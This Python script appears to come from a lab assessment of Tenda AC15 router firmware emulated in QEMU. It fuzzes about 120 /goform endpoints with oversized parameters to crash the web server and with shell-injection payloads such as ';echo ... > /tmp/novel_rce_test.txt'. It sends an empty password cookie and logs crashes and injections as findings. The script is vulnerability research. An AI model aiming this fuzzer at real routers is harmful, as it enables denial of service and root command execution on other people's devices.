#!/usr/bin/env python3
"""
phase4_novel_hunting.py - Novel Vulnerability Hunting via Endpoint Fuzzing

Tests ALL goform endpoints with oversized parameters and injection payloads
to discover new vulnerabilities. Focuses on:
1. Crash detection (stack buffer overflows)
2. Command injection detection
3. Unexplored handlers with zero CVE coverage
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/secsoft-assessor/skills/security-assessment/scripts')

import socket
import time
import os
import json
import subprocess
import signal

from common_base import EvidenceCollector

TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Tenda/evidence"
ROOTFS = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Tenda/firmware/ac15/squashfs-root"

ec = EvidenceCollector(
    "phase4_novel_hunting",
    output_dir=EVIDENCE_DIR,
    target="Tenda AC15 V15.03.05.19 (QEMU emulated)",
    category="firmware",
    phase="Phase 4 - Novel Vulnerability Hunting"
)

# All 120 AC15 handler names (from Phase 1 endpoint mapping)
ALL_HANDLERS = [
    "formAddDhcpPolicy", "formAddMacfilterRule", "formDhcpStatusRefresh",
    "formExpandDlnaStorage", "formGetAutoUpgradeInfo", "formGetDlnaStorage",
    "formGetGuideInfoStatus", "formGetIsOnline", "formGetIptv", "formGetIspInfo",
    "formGetMacFilterMode", "formGetOpenCloudUserInfo", "formGetParentalControl",
    "formGetParentalRuleOfAll", "formGetPortForward", "formGetRouteStatic",
    "formGetSafeStatus", "formGetServerStatus", "formGetWanConnectStatus",
    "formGetWanRate", "formMfgTest", "formSetAutoPing", "formSetCfm",
    "formSetCfmAclFreq", "formSetCfmBuz", "formSetClientState",
    "formSetDebugCfg", "formSetDeviceName", "formSetDlnaStorage",
    "formSetDMZ", "formSetFirewallCfg", "formSetGuideInfoStatus",
    "formSetIpMacBind", "formSetIptv", "formSetLED", "formSetMacFilterCfg",
    "formSetOnlineDevName", "formSetOpenCloudUserInfo", "formSetPPTPServer",
    "formSetPPTPUserList", "formSetQosBand", "formSetQvlanPort",
    "formSetRebootTimer", "formSetRemoteWebCfg", "formSetRouteStatic",
    "formSetSafeWanWebMan", "formSetSambaConf", "formSetSaveParentalControl",
    "formSetSpeedWan", "formSetStaticIp", "formSetSysTime",
    "formSetSysToolDDNS", "formSetSysToolReboot", "formSetSysToolRestoreSet",
    "formSetUpgradeFW", "formSetUsbUnload", "formSetVlanInfo",
    "formSetWanPPPoE", "formSetWifiBasicSet", "formSetWifiGuestBasic",
    "formSetWifiGuestHidden", "formSetWifiHideSsid", "formSetWifiMac",
    "formSetWifiPower", "formSetWifiRadioRepeat", "formSetWifiSchedule",
    "formSetWifiWps", "formSetWizardCompleted", "formSetWrlOn",
    "formTendaAte", "formWriteFacMac", "formWriteFacCountry",
    "formWriteFacRegDomain", "formWriteFacPin", "formSetDhcpLease",
    "formDhcpLease", "formSetDhcpServer", "formSetFirewallAdvCfg",
    "formSetIP", "formSetLoginPwd", "formSetMacFilterRole",
    "formSetPptpMppe", "formSetWAN", "formWifiApScan",
    "formWifiApScanStop", "formLoginAuth",
    # Additional endpoints found via strings
    "formSetDDNS", "formGetDDNS", "formSetVPN", "formGetVPN",
    "formSetFTP", "formGetFTP", "formSetUSB", "formGetUSB",
    "formSetWPS", "formGetWPS", "formSetNTP", "formGetNTP",
    "formSetDMZHost", "formGetDMZHost", "formSetPortForward",
    "formDelPortForward", "formSetUPnP", "formGetUPnP",
    "formSetScheduleWifi", "formGetScheduleWifi",
    "formSetNetControl", "formGetNetControl",
    "formSetLanDhcpServer", "formGetLanDhcpServer",
    "formSetSystemlog", "formGetSystemlog",
    "formSetSysToolManage", "formSetClientFilter",
    "formSetURLFilter", "formGetURLFilter",
    "formDelMacfilterRule", "formSetParentalControl",
]

# Known vulnerable handlers (already have findings)
KNOWN_VULNERABLE = {
    "formSetFirewallCfg", "formWriteFacMac", "formSetWifiBasicSet",
    "formSetPPTPUserList", "formMfgTest", "formTendaAte",
}

# Common injection payloads
CMD_INJECT_PAYLOADS = [
    ";echo CMDTEST123",           # semicolon injection
    "|echo CMDTEST123",           # pipe injection
    "$(echo CMDTEST123)",         # command substitution
    "`echo CMDTEST123`",          # backtick injection
    "\necho CMDTEST123",          # newline injection
]

# File creation payloads for proving RCE
FILE_PAYLOADS = [
    ";echo NOVEL_RCE > /tmp/novel_rce_test.txt",
]

# Common parameter names in Tenda handlers
COMMON_PARAMS = [
    "ip", "mac", "mask", "gw", "dns", "dns1", "dns2",
    "ssid", "pwd", "password", "username", "user",
    "port", "proto", "hostname", "domain", "server",
    "time", "ntp", "timezone", "ddns", "pppoe",
    "startIp", "endIp", "lease", "gateway",
    "rule", "enable", "en", "mode", "type",
    "name", "list", "index", "wan", "lan",
    "wl", "channel", "security", "encrypt",
    "firewall", "dmz", "upnp", "pptp", "vpn",
    "url", "comment", "remark", "data", "value",
    "sIp", "eIp", "inIp", "exPort", "inPort",
]


def raw_http(path, method="POST", body="", headers_dict=None, timeout=5):
    """Raw HTTP request via socket."""
    if headers_dict is None:
        headers_dict = {}
    h = f"{method} {path} HTTP/1.0\r\nHost: {TARGET}\r\n"
    for k, v in headers_dict.items():
        h += f"{k}: {v}\r\n"
    if body:
        h += f"Content-Length: {len(body)}\r\n"
        h += "Content-Type: application/x-www-form-urlencoded\r\n"
    h += "\r\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.send((h + body).encode())
        resp = b""
        while True:
            try:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
            except:
                break
        s.close()
        resp_str = resp.decode('utf-8', errors='replace')
        first_line = resp_str.split('\r\n')[0]
        status = 0
        if 'HTTP/' in first_line:
            try:
                status = int(first_line.split()[1])
            except:
                pass
        parts = resp_str.split('\r\n\r\n', 1)
        body_out = parts[1] if len(parts) > 1 else ""
        return status, body_out
    except Exception as e:
        return 0, str(e)


def is_alive():
    """Quick check if httpd responds."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET, PORT))
        s.send(b"GET / HTTP/1.0\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n")
        resp = s.recv(100)
        s.close()
        return b"HTTP/" in resp
    except:
        return False


def restart_httpd():
    """Kill and restart httpd in QEMU."""
    os.system("sudo killall qemu-arm 2>/dev/null")
    time.sleep(1)
    cmd = f"sudo /usr/bin/qemu-arm -L {ROOTFS} {ROOTFS}/bin/httpd > /tmp/httpd_phase4.log 2>&1 &"
    os.system(cmd)
    # Wait for startup
    for _ in range(10):
        time.sleep(1)
        if is_alive():
            return True
    return False


def fuzz_handler_overflow(handler_name):
    """Test a handler with oversized parameters to detect crashes."""
    endpoint = f"/goform/{handler_name.replace('form', '', 1)}"

    # Build body with common params, each oversized
    bodies = []

    # Test 1: Single large parameter
    for param in COMMON_PARAMS[:10]:
        bodies.append((param, f"{param}={'X' * 500}"))

    # Test 2: All common params at once, medium size
    all_params = "&".join(f"{p}={'Y' * 200}" for p in COMMON_PARAMS[:15])
    bodies.append(("all_params_200", all_params))

    crashes = []
    for test_name, body in bodies:
        if not is_alive():
            print(f"    [!] httpd dead before testing {test_name}, restarting...")
            if not restart_httpd():
                print(f"    [!] Failed to restart httpd")
                return crashes

        status, resp = raw_http(endpoint, "POST", body,
                               {"Cookie": "password="}, timeout=5)
        time.sleep(0.5)

        if not is_alive():
            crash_info = {
                "handler": handler_name,
                "endpoint": endpoint,
                "param": test_name,
                "body_length": len(body),
                "status": status,
            }
            crashes.append(crash_info)
            print(f"    [+] CRASH: {handler_name} crashed with {test_name} ({len(body)} bytes)")
            restart_httpd()

    return crashes


def fuzz_handler_cmdinject(handler_name):
    """Test a handler for command injection."""
    endpoint = f"/goform/{handler_name.replace('form', '', 1)}"

    # Clean proof file
    proof_file = "/tmp/novel_rce_test.txt"
    os.system(f"sudo rm -f {proof_file}")

    injections = []

    for param in COMMON_PARAMS[:8]:
        payload = f"{param}=;echo NOVEL_RCE_{handler_name} > /tmp/novel_rce_test.txt"
        if not is_alive():
            restart_httpd()
            if not is_alive():
                return injections

        status, resp = raw_http(endpoint, "POST", payload,
                               {"Cookie": "password="}, timeout=5)
        time.sleep(1)

        if os.path.exists(proof_file):
            try:
                with open(proof_file) as f:
                    content = f.read().strip()
            except:
                content = "(unreadable)"

            injection_info = {
                "handler": handler_name,
                "endpoint": endpoint,
                "parameter": param,
                "payload": payload,
                "proof_content": content,
                "status": status,
            }
            injections.append(injection_info)
            print(f"    [+] CMD INJECTION: {handler_name} via {param}!")
            print(f"        Proof: {proof_file} = '{content}'")
            os.system(f"sudo rm -f {proof_file}")

    return injections


def main():
    print("="*60)
    print(" TendaAssmt NOVEL VULNERABILITY HUNTING")
    print(f" Target: http://{TARGET}:{PORT}")
    print(f" Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*60)

    if not is_alive():
        print("[!] httpd not responsive, starting...")
        if not restart_httpd():
            print("[!] Failed to start httpd")
            return

    # Filter to unexplored handlers (not in KNOWN_VULNERABLE)
    unexplored = [h for h in ALL_HANDLERS if h not in KNOWN_VULNERABLE]
    print(f"\n[*] Total handlers: {len(ALL_HANDLERS)}")
    print(f"[*] Known vulnerable: {len(KNOWN_VULNERABLE)}")
    print(f"[*] To test: {len(unexplored)}")

    all_crashes = []
    all_injections = []

    # Phase 4a: Crash detection (overflow fuzzing)
    print("\n" + "="*60)
    print(" PHASE 4a: Crash Detection (Overflow Fuzzing)")
    print("="*60)

    # Prioritize handlers likely to have system/doSystemCmd calls
    # based on their names
    high_priority = [h for h in unexplored if any(kw in h.lower() for kw in [
        "ddns", "pptp", "vpn", "ntp", "ping", "debug", "sys", "static",
        "speed", "wan", "dns", "dhcp", "reboot", "up[REDACTED]", "restore",
        "remote", "samba", "ftp", "client", "schedule", "net", "url",
        "mac", "ip", "port", "qos", "vlan", "iptv", "led",
        "ate", "test", "write", "login", "pwd",
    ])]
    low_priority = [h for h in unexplored if h not in high_priority]

    print(f"\n[*] High priority handlers: {len(high_priority)}")
    print(f"[*] Low priority handlers: {len(low_priority)}")

    tested = 0
    for handler in high_priority + low_priority[:20]:
        tested += 1
        print(f"\n  [{tested}/{len(high_priority)+20}] Testing {handler}...")
        crashes = fuzz_handler_overflow(handler)
        if crashes:
            all_crashes.extend(crashes)
            for crash in crashes:
                ec.add_finding(
                    f"NOVEL-CRASH-{len(all_crashes)}",
                    "HIGH",
                    f"Stack Overflow Crash in {handler}",
                    f"Handler {handler} crashed when parameter '{crash['param']}' "
                    f"was set to {crash['body_length']} bytes. "
                    f"Endpoint: {crash['endpoint']}",
                    evidence=json.dumps(crash),
                    impact="Denial of service, potential RCE",
                    cwe="CWE-121: Stack-based Buffer Overflow"
                )

    print(f"\n[*] Overflow fuzzing complete: {len(all_crashes)} crashes in {tested} handlers")

    # Phase 4b: Command Injection Detection
    print("\n" + "="*60)
    print(" PHASE 4b: Command Injection Detection")
    print("="*60)

    # Test handlers with "cmd", "system", "exec" patterns or
    # handlers that handle network/system configuration
    cmdinject_targets = [h for h in unexplored if any(kw in h.lower() for kw in [
        "ddns", "ping", "debug", "ntp", "sys", "speed",
        "up[REDACTED]", "restore", "samba", "ftp", "remote",
        "pptp", "vpn", "wan", "write", "ate", "test",
        "mac", "static", "set", "reboot",
    ])]

    print(f"\n[*] Command injection targets: {len(cmdinject_targets)}")

    tested_ci = 0
    for handler in cmdinject_targets[:30]:
        tested_ci += 1
        if tested_ci % 5 == 0:
            print(f"\n  [{tested_ci}/{min(30, len(cmdinject_targets))}] Testing {handler} for injection...")
        else:
            print(f"  [{tested_ci}] {handler}...", end=" ", flush=True)

        injections = fuzz_handler_cmdinject(handler)
        if injections:
            all_injections.extend(injections)
            for inj in injections:
                ec.add_finding(
                    f"NOVEL-CMDINJ-{len(all_injections)}",
                    "CRITICAL",
                    f"Command Injection in {handler} via '{inj['parameter']}'",
                    f"Handler {handler} passes parameter '{inj['parameter']}' "
                    f"to a system command without sanitization. "
                    f"Proof: echo command created /tmp/novel_rce_test.txt "
                    f"with content '{inj['proof_content']}'.",
                    evidence=json.dumps(inj),
                    impact="Arbitrary command execution as root",
                    cwe="CWE-78: OS Command Injection",
                    cvss="8.8"
                )
        else:
            print("clean")

    print(f"\n[*] Command injection testing complete: {len(all_injections)} injections in {tested_ci} handlers")

    # Summary
    print("\n" + "="*60)
    print(" NOVEL HUNTING SUMMARY")
    print("="*60)
    print(f"  Handlers tested for overflow: {tested}")
    print(f"  Crashes found: {len(all_crashes)}")
    print(f"  Handlers tested for injection: {tested_ci}")
    print(f"  Command injections found: {len(all_injections)}")

    if all_crashes:
        print("\n  Crash Details:")
        for c in all_crashes:
            print(f"    - {c['handler']}: param={c['param']}, size={c['body_length']}")

    if all_injections:
        print("\n  Injection Details:")
        for i in all_injections:
            print(f"    - {i['handler']}: param={i['parameter']}, proof='{i['proof_content']}'")

    # Add summary test
    ec.add_test("PHASE4_SUMMARY", "Novel vulnerability hunting complete",
               result="PASS",
               notes=f"Tested {tested} handlers for overflow ({len(all_crashes)} crashes), "
                     f"{tested_ci} handlers for injection ({len(all_injections)} injections)")

    ec.save(f"{EVIDENCE_DIR}/phase4_novel_hunting.json")
    print(f"\n[*] Evidence saved to {EVIDENCE_DIR}/phase4_novel_hunting.json")


if __name__ == "__main__":
    main()
